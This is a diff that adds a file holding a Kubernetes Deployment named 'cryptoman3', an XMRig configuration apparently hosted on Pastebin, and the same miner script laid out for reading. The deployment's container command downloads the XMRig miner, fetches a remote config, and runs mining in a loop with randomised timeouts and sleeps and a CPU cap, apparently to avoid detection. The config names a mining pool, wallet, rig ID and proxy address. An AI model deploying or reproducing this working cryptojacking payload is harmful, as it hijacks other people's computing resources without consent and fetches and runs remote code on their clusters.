@@ -1,0 +1,61 @@
+### Kubernetes Deployment
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: cryptoman3
+  name: cryptoman3
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: cryptoman3
+  template:
+    metadata:
+      labels:
+        app: cryptoman3
+    spec:
+      containers:
+      - image: nginx
+        name: nginx3
+        command:
+          - bash
+          - -c 
+          - curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz;curl -o /var/tmp/config.json https://pastebin.com/raw/yFNigSAC;chmod 777 /var/tmp/xmrig;cd /var/tmp;tar -xvf xmrig;cp xmrig-6.14.0/xmrig ./xmrig;while true;do timeout $(($(($RANDOM%(3600-600+1)))+600)) ./xmrig -c config.json > /dev/null 2>&1;sleep $(($(($RANDOM%(5000-600+1)))+600));done
+        resources: {}
+
+### Pastebin config file
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "max-cpu-usage": 29,
+    "pools": [
+        {
+            "url": "pool.minexmr.com:443",
+            "user": "458E7mziLH58fSAkwRe7B7LPnEWmeSWEWgcq3UNWjFt5MQFWGUxSpZcPR76H87BaRKRt8aJRCFLupb7iSQeoGBZ7R1yPANg",
+            "rig-id": "charlie",
+            "keepalive": true,
+            "tls": true,
+            "proxy": "116.203.103.227:8888"
+        }
+    ]
+}
+
+### XMRig mining script in readable format
+
+#!/bin/bash
+curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+curl -o /var/tmp/config.json https://pastebin.com/raw/yFNigSAC #29% cpu cap 
+chmod 777 /var/tmp/xmrig
+cd /var/tmp
+tar -xvf xmrig
+cp xmrig-6.14.0/xmrig ./xmrig
+while true :
+  do
+    timeout $(($(($RANDOM%(3600-600+1)))+600)) ./xmrig -c config.json > /dev/null 2>&1
+    sleep $(($(($RANDOM%(5000-600+1)))+600))
+done
+
